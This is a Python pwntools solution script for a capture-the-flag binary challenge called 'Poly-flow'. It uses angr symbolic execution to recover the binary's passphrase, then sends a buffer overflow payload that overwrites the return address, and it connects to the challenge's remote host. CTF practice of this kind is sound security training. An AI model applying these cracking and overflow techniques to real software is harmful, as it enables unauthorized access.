#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host binary.challs.pragyanctf.tech --port 6002 Poly-flow
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('Poly-flow')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

import angr
import claripy

p = angr.Project(exe.path)

password_chars = [claripy.BVS("byte_%d" % i, 8) for i in range(0x10)]
password = claripy.Concat(*password_chars + [claripy.BVV(b'\0')])
password_addr = 0

s = p.factory.call_state(exe.sym['check'], password_addr,
        add_options=set.union(
            angr.options.unicorn,
            {
                angr.options.LAZY_SOLVES,
                angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
                angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
            }))

s.memory.store(password_addr, password)

for c in password_chars:
    s.solver.add(c < 0x7f)
    s.solver.add(c > 0x20)

sim = p.factory.simgr(s)

sim.explore(find=0x0804984f, avoid=0x08049856)

password_concrete = bytes.fromhex(hex(sim.found[0].solver.eval(password))[2:])
print(password_concrete[:-1].decode())



io = start()

io.sendlineafter(
        b"Enter the passphrase: ",
        password_concrete + flat({0x18 + 0x4 - 1: exe.sym['input']})
        )

for i in range(5):
    io.sendline(flat({0x18 + 0x4: exe.sym['input']}))

io.interactive()

